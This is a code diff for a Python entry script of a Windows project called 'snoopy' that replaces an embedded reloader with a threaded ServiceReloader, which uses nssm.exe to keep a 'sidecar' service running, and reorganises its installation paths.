@@ -1,15 +1,16 @@
-from lib.file_finder import get_embedded_filename
 from lib.daemon import Daemon
 from win32.killer import GracefulKiller
+from win32.service_reloader import ServiceReloader
 from win32 import capture as catcher
+import threading
 
 directory         = 'HOME_DIRECTORY'
-# directory         = 'C:\\Users\\rwilson\\code\\snoopy'
-installation_path = '{}\\dist\\snoopy'.format(directory)
+snoopy_path       = r'{}\dist\snoopy'.format(directory)
+sidecar_path      = r'{}\dist\sidecar'.format(directory)
+installation_path = r'{}\dist'.format(directory)
 secret_key        = 'SUPER_SECRET_KEY'
-# secret_key        = 'U1VQRVJfU0VDUkVUX0tFWQ=='
 mail_config       = 'mail.config'
-reloader_name     = 'reload_service.exe'
+service           = 'sidecar'
 
 
 class MyDaemon(Daemon):
@@ -26,8 +27,21 @@ class MyDaemon(Daemon):
         pass
 
 
+def create_reloader():
+    ServiceReloader(
+        r'{}\nssm.exe'.format(snoopy_path),
+        service,
+        directory,
+        [r'{}\{}.exe'.format(sidecar_path, service)],
+        7111
+    )
+
+
 if __name__ == "__main__":
+    t = threading.Thread(target=create_reloader)
+    t.daemon = True
+    t.start()
     killer = GracefulKiller(
         MyDaemon(),
-        get_embedded_filename(reloader_name))
+        7110)
     killer.run()
